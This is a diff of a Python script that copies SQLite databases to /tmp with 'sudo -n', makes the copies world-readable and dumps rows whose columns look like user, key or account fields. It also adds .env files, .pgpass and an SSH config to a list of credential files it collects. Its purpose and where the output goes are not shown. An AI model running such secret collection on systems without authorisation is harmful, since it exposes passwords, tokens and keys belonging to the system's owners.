@@ -98,17 +98,27 @@ INTERESTING = ("user", "ai_", "key", "setting", "account", "provider",
 
 
 def dump_db(path, max_rows=250, max_cell=700):
-    if not os.path.isdir(path) is False:
+    """Copy the database (plus WAL/SHM) to /tmp with sudo, then read the copy.
+
+    Reading the live file directly fails with "database is locked" for running
+    services, so the copy is what we inspect; the original is never opened for
+    write and never modified.
+    """
+    if os.path.isdir(path):
         return
     emit("db-path", path)
-    local = path
-    tmp = None
-    if not os.access(path, os.R_OK):
-        tmp = "/tmp/d3-" + os.path.basename(path).replace("/", "_")
-        run("sudo -n cp %s %s && sudo -n chmod 644 %s" % (shq(path), shq(tmp), shq(tmp)))
-        local = tmp
+    base = "/tmp/d3-" + os.path.basename(path).replace("/", "_")
+    for suf in ("", "-wal", "-shm"):
+        src = path + suf
+        dst = base + suf
+        run("sudo -n rm -f %s; sudo -n [ -f %s ] && sudo -n cp %s %s && sudo -n chmod 644 %s"
+            % (shq(dst), shq(src), shq(src), shq(dst), shq(dst)))
+    local = base
+    if not os.path.exists(local):
+        emit("db-err", "%s unreadable" % path)
+        return
     try:
-        con = sqlite3.connect("file:%s?mode=ro" % local, uri=True, timeout=15)
+        con = sqlite3.connect("file:%s?mode=ro&immutable=1" % local, uri=True, timeout=20)
     except Exception as e:  # noqa: BLE001
         emit("db-err", "%s open: %s" % (path, e))
         return
@@ -131,10 +141,11 @@ def dump_db(path, max_rows=250, max_cell=700):
                 emit("db-%s-%s" % (os.path.basename(path), n), json.dumps(row))
             else:
                 emit("db-skip", "%s %s rows=%d" % (path, n, len(row["rows"])))
+    except Exception as e:  # noqa: BLE001
+        emit("db-err", "%s: %s" % (path, e))
     finally:
         con.close()
-    if tmp:
-        run("rm -f %s" % shq(tmp))
+        run("rm -f %s %s-wal %s-shm" % (shq(base), shq(base), shq(base)))
 
 
 # --------------------------------------------------------------------- files
@@ -163,12 +174,18 @@ FILES = [
     "/home/ubuntu/team-split-projects-20260923152804.txt",
     "/root/.config/rclone/rclone.conf",
     "/root/.ssh/authorized_keys",
+    "/opt/pingrly/.env",
+    "/opt/go-email/.env",
+    "/home/ubuntu/.pgpass",
+    "/home/ubuntu/.ssh/config",
+    "/opt/buildme/data/buildme.db",
 ]
 
 DBGLOBS = [
     "/opt/pool/data/*.db",
     "/opt/75hard/data/*.db",
     "/opt/75hard/*.db",
+    "/opt/75hard/data/*.bak*",
     "/opt/learn/data/*.db",
     "/opt/buildme/data/*.db",
     "/opt/aiagentlens/data/*.db",
